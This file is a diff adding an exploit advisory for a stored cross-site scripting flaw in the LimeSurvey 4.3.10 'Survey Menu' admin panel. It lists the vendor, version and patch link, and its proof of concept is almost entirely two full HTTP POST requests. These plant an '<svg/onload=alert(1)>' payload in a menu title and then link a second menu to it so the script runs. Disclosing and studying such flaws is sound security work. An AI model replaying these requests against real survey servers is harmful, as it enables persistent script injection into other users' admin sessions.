@@ -1,0 +1,51 @@
+# Exploit Title: LimeSurvey 4.3.10 - 'Survey Menu' Persistent Cross-Site Scripting 
+# Date: 2020-08-23
+# Exploit Author: Matthew Aberegg
+# Vendor Homepage: https://www.limesurvey.org
+# Version: LimeSurvey 4.3.10+200812
+# Tested on: Ubuntu 18.04.4
+# Patch Link: https://github.com/LimeSurvey/LimeSurvey/commit/3712854a8fd8d875c67640969a1d54c4d93d3676
+
+
+# Vulnerability Details
+Description : A stored cross-site scripting vulnerability exists within the "Survey Menu" functionality of the LimeSurvey administration panel.
+Vulnerable Parameters : Surveymenu[parent_id]
+
+
+# POC
+# Request 1 : Create a survey menu with the Surveymenu[title] parameter set to an XSS payload.
+
+POST /limesurvey/index.php/admin/menus/sa/update/id/ HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 524
+Origin: http://TARGET
+Connection: close
+Referer: http://TARGET/limesurvey/index.php/admin/menus/sa/view
+Cookie: LS-MRZROBQAFECYWCMT=v1ac49ivhs7bb5ocb8sqc7oq51; YII_CSRF_TOKEN=MHJySEhYVVcyNVc5YW5lcGNnRnozWVFGfldsOWtTT0XF8KTDFDqAxWRy74os9IE7fnIebwNOpPUORaKPD3o4fA%3D%3D
+
+YII_CSRF_TOKEN=MHJySEhYVVcyNVc5YW5lcGNnRnozWVFGfldsOWtTT0XF8KTDFDqAxWRy74os9IE7fnIebwNOpPUORaKPD3o4fA%3D%3D&Surveymenu%5Bparent_id%5D=&Surveymenu%5Bsurvey_id%5D=&Surveymenu%5Buser_id%5D=&Surveymenu%5Bordering%5D=0&Surveymenu%5Bshowincollapse%5D=0&Surveymenu%5Bname%5D=realmenu&Surveymenu%5Btitle%5D=%3Csvg%2Fonload%3Dalert(1)%3E&Surveymenu%5Bdescription%5D=XSS+Test&Surveymenu%5Bposition%5D=side&Surveymenu%5Bchanged_by%5D=1&Surveymenu%5Bchanged_at%5D=2020-08-15+20%3A40%3A10&Surveymenu%5Bcreated_by%5D=1&Surveymenu%5Bid%5D=
+
+
+# Request 2 : Create a survey menu with the Surveymenu[parent_id] parameter set to the survey id from the previous request.  The XSS payload will be triggered by this survey menu.
+
+POST /limesurvey/index.php/admin/menus/sa/update/id/ HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 505
+Origin: http://TARGET
+Connection: close
+Referer: http://TARGET/limesurvey/index.php/admin/menus/sa/view
+Cookie: LS-MRZROBQAFECYWCMT=v1ac49ivhs7bb5ocb8sqc7oq51; YII_CSRF_TOKEN=MHJySEhYVVcyNVc5YW5lcGNnRnozWVFGfldsOWtTT0XF8KTDFDqAxWRy74os9IE7fnIebwNOpPUORaKPD3o4fA%3D%3D
+
+YII_CSRF_TOKEN=MHJySEhYVVcyNVc5YW5lcGNnRnozWVFGfldsOWtTT0XF8KTDFDqAxWRy74os9IE7fnIebwNOpPUORaKPD3o4fA%3D%3D&Surveymenu%5Bparent_id%5D=11&Surveymenu%5Bsurvey_id%5D=&Surveymenu%5Buser_id%5D=5&Surveymenu%5Bordering%5D=1&Surveymenu%5Bshowincollapse%5D=0&Surveymenu%5Bname%5D=xssmenu&Surveymenu%5Btitle%5D=XSS+Test&Surveymenu%5Bdescription%5D=XSS+Test&Surveymenu%5Bposition%5D=side&Surveymenu%5Bchanged_by%5D=1&Surveymenu%5Bchanged_at%5D=2020-08-15+20%3A42%3A58&Surveymenu%5Bcreated_by%5D=1&Surveymenu%5Bid%5D=
